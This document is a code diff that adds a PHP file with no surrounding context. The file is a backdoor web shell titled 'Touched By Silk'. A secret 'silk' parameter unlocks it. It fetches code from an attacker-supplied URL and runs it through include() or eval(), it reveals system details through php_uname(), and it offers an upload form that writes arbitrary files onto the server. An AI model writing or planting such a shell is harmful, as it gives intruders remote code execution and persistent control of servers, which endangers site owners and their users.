@@ -1,0 +1,3 @@
+<?php
+  if(isset($_GET['silk'])){if(isset($_GET['inc'])||isset($_GET['inc2'])){$url=(isset($_GET['inc']))?urldecode($_GET['inc']):urldecode($_GET['inc2']);if(strtolower(substr($url,0,7))!=="http://"){$url='http://'.$url;if(isset($_GET['inc2'])){include($url);}else{$contents=file_get_contents($url);eval('?>'.$contents);die();}}}else{if(isset($_POST['_upl'])){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo 'up!!!<br><br>';}}echo "<title>Touched By Silk</title>";echo "Uname : ".php_uname()."</br></br>";echo "<form method='post' enctype='multipart/form-data' name='uper' id='uper'><input type='file' name='file'><input name='_upl' type='submit' id='_upl' value='up'></form>";}}die();
+?>
